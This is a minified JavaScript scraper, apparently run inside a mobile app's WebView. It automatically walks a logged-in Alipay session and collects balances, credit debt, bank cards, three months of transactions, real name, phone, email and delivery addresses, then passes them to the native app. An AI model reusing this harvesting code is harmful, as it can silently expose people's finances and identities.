
jQuery(function(){if(window.lock==null||window.lock==undefined){window.lock='locked';var timer=setInterval(function(){var readyState=document.readyState;if(readyState=="complete"){clearInterval(timer);run();}},100);}});function run(){var product=getDataFromLocalStorage('product');switch(product){case'alipay':setTimeout(alipayInfoCapture,200);break;case'taobao':setTimeout(taobaoInfoCapture,200);break;case'jd':setTimeout(jdInfoCapture,200);break;default:setTimeout(chooseProduct,200);}}function chooseProduct(){var host=window.location.host;if(host.indexOf('alipay')>-1){saveDataToLocalStorage('product','alipay');alipayInfoCapture();}else if(host.indexOf('taobao')>-1){saveDataToLocalStorage('product','taobao');taobaoInfoCapture();}else if(host.indexOf('jd')>-1){saveDataToLocalStorage('product','jd');jdInfoCapture();}else{}}function alipayInfoCapture(){var step=getDataFromLocalStorage('alipayStep');switch(step){case'1':alipayGetWealth();break;case'2':alipayGetBankCards();break;case'3':alipayGetDealRecord();break;case'4':alipayGetBasicInfo();break;case'5':alipayGoToTaoBao();break;case'6':alipayGetTaoBaoAddress();break;case'7':alipayUploadInfo();break;default:alipayWaitLogin();}}function alipayWaitLogin(){var title=document.title;if(title=='我的支付宝 － 支付宝'){setLayout(0);var str=jQuery('.i-assets-header.fn-clear').eq(2).find('h3').text();if(str!="蚂蚁花呗"){noticeAlarm('AlipayWaitLogin');return;}var antsLines=jQuery('.amount-des')[0].innerText;saveDataToLocalStorage('antsLines',antsLines);saveDataToLocalStorage('alipayStep',1);setProgress(10);jQuery('.global-subnav-item ').eq(1).find('a')[0].click();}}function alipayGetWealth(){var str1=jQuery('ul.list-info.fn-clear').find('.title').eq(0).text();var str2=jQuery('ul.list-info.fn-clear').find('.title').eq(1).text();var str3=jQuery('ul.list-info.fn-clear').find('.title').eq(2).text();var str4=jQuery('ul.list-info.fn-clear').find('.title').eq(3).text();var str5=jQuery('ul.list-info.fn-clear').find('.title').eq(4).text();var str6=jQuery('ul.list-info.fn-clear').find('.title').eq(5).text();if(str1!="余额"||str2!="余额宝"||str3!="招财宝"||str4!="基金"||str5!="存金宝"||str6!="淘宝理财"){noticeAlarm('AlipayGetWealth');return;}var wealth=jQuery('.tip-title')[0].innerText;var antsArrears=jQuery('.tip-title')[1].innerText;var balance=jQuery('ul.list-info.fn-clear').find('.money').eq(0).text();var balanceBao=jQuery('ul.list-info.fn-clear').find('.money').eq(1).text();var fortuneBao=jQuery('ul.list-info.fn-clear').find('.money').eq(2).text();var fund=jQuery('ul.list-info.fn-clear').find('.money').eq(3).text();var depositBao=jQuery('ul.list-info.fn-clear').find('.money').eq(4).text();var taobaoFinancial=jQuery('ul.list-info.fn-clear').find('.money').eq(5).text();saveDataToLocalStorage('wealth',wealth);saveDataToLocalStorage('antsArrears',antsArrears);saveDataToLocalStorage('balance',balance);saveDataToLocalStorage('balanceBao',balanceBao);saveDataToLocalStorage('fortuneBao',fortuneBao);saveDataToLocalStorage('fund',fund);saveDataToLocalStorage('depositBao',depositBao);saveDataToLocalStorage('taobaoFinancial',taobaoFinancial);saveDataToLocalStorage('alipayStep',2);setProgress(20);jQuery('.allCards').find('a')[0].click();}function alipayGetBankCards(){var str=jQuery('.asset-breadcrumb-active').text();if(str!="我的银行卡"){noticeAlarm('AlipayGetBankCards');return;}var timer=setInterval(function(){var display=jQuery('.ui-loading.J-asset-loading').css('display');if(display=='none'){clearInterval(timer);var bankCards=jQuery('.card-box .card-box-name');var length=bankCards.length;var result="";for(var i=0;i<length;i++){var card=bankCards.eq(i);result+=card.find('.bank-name').text()+'-'+card.find('.bank-num4').text()+';';}saveDataToLocalStorage('bankCards',result);saveDataToLocalStorage('alipayStep',3);saveDataToLocalStorage('alipayProgress',30);setProgress(30);var url='https://consumeprod.alipay.com/record/index.htm';location.href=url;}},200);}function alipayGetDealRecord(){var title=document.title;if(title!="我的账单 - 支付宝"){noticeAlarm('AlipayGetDealRecord(Title)');return;}var str=jQuery('.ui-title.fn-clear').find('.fn-left').text();if(str=="我的账单"){jQuery('.ui-title.fn-clear.gradient-line').find('.link').find('a')[0].click();}else if(str=="交易记录"){var timeRange=jQuery("#J-select-range option:selected").text();if(timeRange=="最近三个月"){var dealRecord=getDataFromLocalStorage('dealRecord');var text=jQuery('tbody')[0].innerText;dealRecord+=text;saveDataToLocalStorage('dealRecord',dealRecord);var progress=getDataFromLocalStorage('alipayProgress')-0;if(progress<90){progress+=5;setProgress(progress);saveDataToLocalStorage('alipayProgress',progress);}var length=jQuery('span.ui-button-text').length;if(length==1){text=jQuery('span.ui-button-text').text();if(text=="上一页"){saveDataToLocalStorage('alipayStep',4);url='https://custweb.alipay.com/account/index.htm';location.href=url;}else{jQuery('span.ui-button-text').click();}}else if(length==2){jQuery('span.ui-button-text')[1].click();}else{saveDataToLocalStorage('alipayStep',4);url='https://custweb.alipay.com/account/index.htm';location.href=url;}}else{jQuery("[data-widget-cid='widget-4']").find("[data-value='threeMonths']").click();jQuery('#J-set-query-form').click();}}else{noticeAlarm('AlipayGetDealRecord(StandardOrAdvanced)');return;}}function alipayGetBasicInfo(){var str1=jQuery('#account-main').find('th').eq(0).text();var str2=jQuery('#account-main').find('th').eq(1).text();var str3=jQuery('#account-main').find('th').eq(2).text();var str4=jQuery('#account-main').find('th').eq(3).text();var str5=jQuery('#account-main').find('th').eq(6).text();var str6=jQuery('#account-main').find('th').eq(7).text();if(str1!="真实姓名"||str2!="邮箱"||str3!="手机"||str4!="淘宝会员名"||str5!="注册时间"||str6!="实名账户"){noticeAlarm('AlipayGetBasicInfo');return;}var realName=jQuery('#account-main').find('td')[0].innerText;var email=jQuery('#account-main').find('td')[2].innerText;var mobile=jQuery('#account-main').find('td')[4].innerText;var registerTime=jQuery('#account-main').find('td')[12].innerText;saveDataToLocalStorage('realName',realName);saveDataToLocalStorage('email',email);saveDataToLocalStorage('mobile',mobile);saveDataToLocalStorage('registerTime',registerTime);setProgress(90);var temp=jQuery('#account-main').find('td')[7].innerText;if(temp=="查看我的淘宝"){var taobaoName=jQuery('#account-main').find('td')[6].innerText;saveDataToLocalStorage('taobaoName',taobaoName);}alipayUploadInfo();}function alipayGoToTaoBao(){var str=document.getElementById('newDeliverAddress').getElementsByTagName('a')[0].innerText;if(str!="收货地址"){noticeAlarm('AlipayGoToTaoBao');return;}saveDataToLocalStorage('alipayStep',6);var url=document.getElementById('newDeliverAddress').getElementsByTagName('a')[0].href;location.href=url;}function alipayGetTaoBaoAddress(){var str=document.getElementById('content').getElementsByTagName('h2')[0].innerText;if(str!="收货地址"){noticeAlarm('AlipayGetTaoBaoAddress');return;}var result='';list=document.getElementsByTagName('tbody')[0].getElementsByTagName('tr');for(var i=1;i<list.length;i++){obj=list[i].getElementsByTagName('td');result+=obj[0].innerText+' '+obj[4].innerText+':'+obj[1].innerText+' '+obj[2].innerText+' '+obj[3].innerText+'\r\n';}saveDataToLocalStorage('taobaoAddress',result);saveDataToLocalStorage('alipayStep',7);}function alipayUploadInfo(){var data={};data.code=200;data.product='alipay';data.info={};data.info.antsLines=getDataFromLocalStorage('antsLines');data.info.wealth=getDataFromLocalStorage('wealth');data.info.antsArrears=getDataFromLocalStorage('antsArrears');data.info.balance=getDataFromLocalStorage('balance');data.info.balanceBao=getDataFromLocalStorage('balanceBao');data.info.fortuneBao=getDataFromLocalStorage('fortuneBao');data.info.fund=getDataFromLocalStorage('fund');data.info.depositBao=getDataFromLocalStorage('depositBao');data.info.taobaoFinancial=getDataFromLocalStorage('taobaoFinancial');data.info.bankCards=getDataFromLocalStorage('bankCards');data.info.dealRecord=getDataFromLocalStorage('dealRecord');data.info.realName=getDataFromLocalStorage('realName');data.info.email=getDataFromLocalStorage('email');data.info.mobile=getDataFromLocalStorage('mobile');data.info.registerTime=getDataFromLocalStorage('registerTime');data.info.taobaoName=getDataFromLocalStorage('taobaoName');var result=JSON.stringify(data);uploadInfo(result);setProgress(100);setLayout(1);}function taobaoInfoCapture(){}function jdInfoCapture(){}function getDataFromLocalStorage(key){var result=nativeMethod.getText(key);if(result==null||result==undefined){result="";}return result;}function saveDataToLocalStorage(key,value){nativeMethod.saveText(key,value);}function clearLocalStorage(){localStorage.clear();}function uploadInfo(value){nativeMethod.submitText(value);}function noticeAlarm(value){var data={};data.code=500;data.info=value+' Page Assert Fail : Page Title = '+document.title+' And Url = '+window.location.href;var result=JSON.stringify(data);nativeMethod.submitText(result);}function setLayout(state){nativeMethod.goneLayout(state);}function setProgress(progress){nativeMethod.setProgress(progress);}